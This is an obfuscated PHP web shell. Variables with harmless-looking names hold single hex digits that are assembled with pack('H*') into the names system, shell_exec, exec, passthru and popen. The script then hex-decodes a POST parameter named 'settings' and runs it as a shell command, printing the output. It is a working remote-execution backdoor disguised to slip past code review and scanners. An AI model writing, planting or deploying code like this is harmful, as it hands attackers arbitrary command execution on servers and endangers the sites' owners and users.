<?php


$record1 = '3';
$record2 = '7';
$record3 = '4';
$record4 = '6';
$record5 = 'd';
$record6 = '5';
$record7 = '8';
$record8 = '1';
$record9 = '2';
$record10 = 'f';
$record11 = '0';
$record12 = 'e';
$record13 = '9';
$module_controller1 = pack("H*", '7' . $record1 . $record2 . '9' . $record2 . '3' . $record2 . $record3 . '6' . '5' . $record4 . $record5);
$module_controller2 = pack("H*", '7' . $record1 . '6' . '8' . '6' . $record6 . $record4 . 'c' . $record4 . 'c' . '5' . 'f' . $record4 . $record6 . '7' . '8' . $record4 . '5' . '6' . '3');
$module_controller3 = pack("H*", $record4 . $record6 . '7' . $record7 . '6' . $record6 . $record4 . '3');
$module_controller4 = pack("H*", '7' . '0' . '6' . $record8 . '7' . '3' . '7' . $record1 . '7' . $record3 . $record4 . $record7 . '7' . $record9 . '7' . $record6);
$module_controller5 = pack("H*", '7' . '0' . $record4 . $record10 . $record2 . $record11 . '6' . $record6 . $record4 . $record12);
$module_controller6 = pack("H*", '7' . '3' . '7' . '4' . '7' . $record9 . '6' . $record6 . $record4 . $record8 . $record4 . $record5 . '5' . 'f' . $record4 . $record2 . $record4 . '5' . '7' . '4' . '5' . $record10 . $record4 . '3' . $record4 . 'f' . $record4 . $record12 . '7' . $record3 . '6' . $record6 . '6' . $record12 . '7' . '4' . $record2 . $record1);
$module_controller7 = pack("H*", '7' . '0' . $record4 . $record1 . $record4 . 'c' . $record4 . $record10 . '7' . '3' . '6' . $record6);
$settings = pack("H*", $record2 . $record1 . '6' . '5' . '7' . '4' . $record2 . $record3 . '6' . $record13 . $record4 . 'e' . '6' . '7' . $record2 . $record1);
if (isset($_POST[$settings])) {
    $settings = pack("H*", $_POST[$settings]);
    if (function_exists($module_controller1)) {
        $module_controller1($settings);
    } elseif (function_exists($module_controller2)) {
        print $module_controller2($settings);
    } elseif (function_exists($module_controller3)) {
        $module_controller3($settings, $bind_desc);
        print join("\n", $bind_desc);
    } elseif (function_exists($module_controller4)) {
        $module_controller4($settings);
    } elseif (function_exists($module_controller5) && function_exists($module_controller6) && function_exists($module_controller7)) {
        $object_sym = $module_controller5($settings, 'r');
        if ($object_sym) {
            $res_property_set = $module_controller6($object_sym);
            $module_controller7($object_sym);
            print $res_property_set;
        }
    }
    exit;
}
